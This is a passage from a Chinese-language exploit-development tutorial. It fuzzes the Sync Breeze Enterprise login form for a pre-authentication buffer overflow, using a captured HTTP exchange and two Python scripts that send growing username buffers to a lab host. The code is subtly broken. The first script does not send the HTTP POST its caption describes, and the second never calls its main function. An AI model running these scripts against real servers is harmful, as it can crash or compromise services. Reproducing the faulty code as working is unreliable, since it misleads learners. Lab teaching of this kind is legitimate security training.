
## HTTP 请求示例

```
POST /login HTTP/1.1

Host: 10.11.0.22

User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.11.0.22/login

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 27

username=AAAAA&password=BBBB
```

```
HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 730
```

HTTP 响应主体如下：

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
<meta name='Author' content='Flexense HTTP Server v10.0.28'>
<meta name='GENERATOR' content='Flexense HTTP v10.0.28'>
<title>Sync Breeze Enterprise @ DESKTOP-4WK82B0@ - Error</title>
<link rel='stylesheet' type='text/css' href='resources/syncbreeze.css' media='all'>
</head>
<body>
<center>
<div class='error_message' style='margin-top: 200px;'>
<p>The specified user name and/or password is incorrect.</p>
</div>
<input style='margin-top: 20px;' type='button' value='Close' onClick="history.go(-1);">
</center>
</body>
</html>
```

HTTP 回复显示用户名和密码无效，但这无关紧要，因为我们正在调查的漏洞存在于身份验证发生之前。我们可以复制此 HTTP 通信，并仿照以下示例开始使用 Python 概念验证（PoC）脚本来构建我们的模糊测试器：

```python
#!/usr/bin/python
import socket

def main():
    # 发送恶意缓冲区
    buffer = "/usr/share/man/man1/b*\n"
    size = 0
    while len(buffer) < 1000:
        buffer = buffer + "A"
        size = size + 1
    print("Buffer size: " + str(size))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.11.0.22", 80))
        s.send(buffer)
        s.close()
        print("Done")
    except:
        print("Could not connect!")

main()
```

清单 342 - 执行登录 HTTP POST 的概念验证 Python 脚本

由于我们知道正在处理的是缓冲区溢出漏洞，因此我们将构建基于生成的模糊测试器，使其发送多个具有逐渐变长的用户名的 HTTP POST 请求。我们脚本的下一个迭代版本如清单 343 所示：

![](img/ec25e59d75726b7041242a56d3376832_374_0.png)

```python
#!/usr/bin/python
import socket
import time
import sys

def main():
    size = 100
    while(size < 2000):
        try:
            print "\nSending evil buffer with %s bytes" % size
            inputBuffer = "A" * size
            content = "username=" + inputBuffer + "&password=A"
            buffer = "POST /login HTTP/1.1\r\n"
            buffer += "Host: 10.11.0.22\r\n"
            buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
            buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.*,*;q=0.8\r\n"
            buffer += "Accept-Language: en-US,en;q=0.5\r\n"
            buffer += "Referer: http://10.11.0.22/login\r\n"
            buffer += "Connection: close\r\n"
            buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
            buffer += "Content-Length: " + str(len(content)) + "\r\n"
            buffer += "\r\n"
            buffer += content
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("10.11.0.22", 80))
            s.send(buffer)
            s.close()
            size += 100
            time.sleep(10)
        except:
            print "\nCould not connect!"
            sys.exit()
```
